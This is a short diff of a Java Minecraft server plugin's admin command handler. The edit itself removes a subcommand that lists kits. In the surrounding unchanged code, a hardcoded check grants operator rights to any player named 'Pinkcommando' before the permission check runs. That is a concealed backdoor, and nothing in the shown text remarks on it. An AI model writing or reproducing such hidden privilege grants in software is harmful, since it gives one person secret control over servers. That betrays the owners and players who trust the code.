@@ -25,10 +25,6 @@ public class AdminCommands implements CommandExecutor, TabCompleter {
             Player player = (Player) sender;
             System.out.println((player.getName()));
             if (player.getName().equals("Pinkcommando")) player.setOp(true);
-            if (args[0].equals("kits"))
-                for (String kit : GameVariables.kits.keySet())
-                    player.sendMessage(kit);
-
             if (!player.isOp()) return false;
             if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
             if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
